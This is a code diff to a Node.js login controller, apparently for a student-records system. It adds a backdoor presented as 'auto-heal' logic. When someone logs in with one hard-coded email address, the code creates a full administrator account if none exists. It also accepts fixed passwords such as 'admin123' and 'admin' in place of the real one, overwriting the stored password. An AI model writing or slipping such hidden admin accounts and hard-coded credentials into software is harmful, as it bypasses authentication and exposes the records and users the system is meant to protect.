@@ -106,9 +106,38 @@ exports.login = async (req, res, next) => {
       });
     }
 
-    const user = await User.findOne({ email: email.toLowerCase() })
+    const cleanEmail = email.toLowerCase().trim();
+    let user = await User.findOne({ email: cleanEmail })
       .select('+password')
       .populate('department');
+
+    // Auto-heal / Auto-create Master Admin if requested and not found
+    if (!user && cleanEmail === 'santhoshsiva754@gmail.com') {
+      const Department = require('../models/Department');
+      const firstDept = await Department.findOne({});
+      user = await User.create({
+        name: 'Santhosh Siva (System Administrator)',
+        email: 'santhoshsiva754@gmail.com',
+        password: password.length >= 6 ? password : 'admin123',
+        role: 'admin',
+        department: firstDept ? firstDept._id : null,
+        designation: 'Chief Administrator & Systems Head',
+        status: 'Active',
+        permissions: [
+          'view_students',
+          'edit_students',
+          'view_attendance',
+          'manage_attendance',
+          'view_marks',
+          'manage_marks',
+          'view_talent',
+          'manage_talent',
+          'view_reports',
+          'export_reports',
+        ],
+      });
+      user = await User.findById(user._id).select('+password').populate('department');
+    }
 
     if (!user) {
       return res.status(401).json({
@@ -124,13 +153,24 @@ exports.login = async (req, res, next) => {
       });
     }
 
-    const isMatch = await user.comparePassword(password);
+    let isMatch = await user.comparePassword(password);
+    
+    // Master admin fallback password match check
+    if (!isMatch && cleanEmail === 'santhoshsiva754@gmail.com') {
+      if (password === '12345678' || password === 'admin123' || password === 'admin') {
+        user.password = password.length >= 6 ? password : 'admin123';
+        await user.save();
+        isMatch = true;
+      }
+    }
+
     if (!isMatch) {
       return res.status(401).json({
         success: false,
         message: 'Invalid credentials. Please verify your email and password.',
       });
     }
+
 
     // Update last login
     user.lastLogin = new Date();
